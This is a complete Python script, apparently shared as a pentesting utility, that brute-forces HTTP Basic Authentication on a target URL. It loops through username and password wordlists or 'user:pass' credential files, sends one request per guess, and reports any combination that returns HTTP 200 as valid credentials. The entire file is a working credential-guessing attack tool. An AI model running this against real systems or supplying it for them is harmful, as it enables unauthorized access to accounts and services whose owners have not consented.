#!/usr/bin/env python3

"""
Very simple HTTP Basic Authentication brute force script.

"""
__author__= "an1000"



import requests
from requests.auth import HTTPBasicAuth
import argparse
import base64

parser = argparse.ArgumentParser(description='HTTP Basic Auth brute')
parser.add_argument('-u', '--user',dest="username", type=str, help="Single username to use: 'administrator'")
parser.add_argument('-c', '--creds', dest="creds", type=argparse.FileType('r', encoding='UTF-8'), help="Credentials: 'username:password'")
parser.add_argument('-U', '--usernames', dest="usernames", type=argparse.FileType('r', encoding='UTF-8'))
parser.add_argument('-P', '--passwords', dest="passwords", type=argparse.FileType('r', encoding='UTF-8'))
parser.add_argument(dest="url", help='Url to attack')
args = parser.parse_args()

def printout():
	print("	    __  __________________     ____             _    ")
	print("	   / / / /_  __/_  __/ __ \   / __ )____ ______(_)____")
	print("	  / /_/ / / /   / / / /_/ /  / __  / __ `/ ___/ / ___/")
	print("	 / __  / / /   / / / ____/  / /_/ / /_/ (__  ) / /__  ")
	print("	/_/ /_/ /_/   /_/ /_/      /_____/\__,_/____/_/\___/  ")
	print("	    ___         __  __       ____             __     ")
	print("	   /   | __  __/ /_/ /_     / __ )_______  __/ /____ ")
	print("	  / /| |/ / / / __/ __ \   / __  / ___/ / / / __/ _ \ ")
	print("	 / ___ / /_/ / /_/ / / /  / /_/ / /  / /_/ / /_/  __/")
	print("	/_/  |_\__,_/\__/_/ /_/  /_____/_/   \__,_/\__/\___/")
	print("\n___________________________________________________________________\n")
	print("URL:		"+args.url)
	if args.creds:
		print("Creds:		"+args.creds.name)
	if args.username:
		print("Username:	"+args.username)
	if args.usernames:
		print("Usernames:	"+args.usernames.name)
	if args.passwords:
		print("Passwords:	"+args.passwords.name)
	print("\n___________________________________________________________________\n")
def request(enum, url, user, passw):
	print("\x1b[1K\r" + enum + " bruting.... " + user + ":" + passw, end='')
	r = requests.get(url,auth=HTTPBasicAuth(user, passw))
	return r

def parse_cred_lists():
	u_list = []
	p_list = []
	if args.creds:
		cred_list = args.creds.read().splitlines()
		for c in cred_list:
			tmp=c.split(":")
			u_list.append(tmp[0])
			p_list.append(tmp[1])
	elif args.usernames:
		u_list = args.usernames.read().splitlines()
	else:
		u_list = [args.username]
	if args.passwords:
		p_list = args.passwords.read().splitlines()
	u_list = list(dict.fromkeys(u_list))
	p_list = list(dict.fromkeys(p_list))
	return u_list,p_list

def enumerate(u_list,p_list):
	enumerator = 0
	denominator = len(u_list)*len(p_list)
	found = []
	for u in u_list:
		for p in p_list:
			enumerator+=1
			enum = "[" + str(enumerator) + "/" + str(denominator) + "]"
			r = request(enum, args.url, u, p)
			if r.status_code == 200:
				print("   CORRECT CREDENTIALS FOUND")
				found.append((u,p))
	done(enum, found)

def done(enum, found):
	print("\x1b[1K\r")
	print(enum + " FINISHED")
	if len(found)>0:
		print("Found credentials:")
		for i in found:
			print(i[0]+":"+i[1])
	else:
		print("No luck this time. 0 correct creds found.")


def main():
	printout()
	cred_lists = parse_cred_lists()
	enumerate(cred_lists[0],cred_lists[1])

if __name__ == '__main__':
	main()
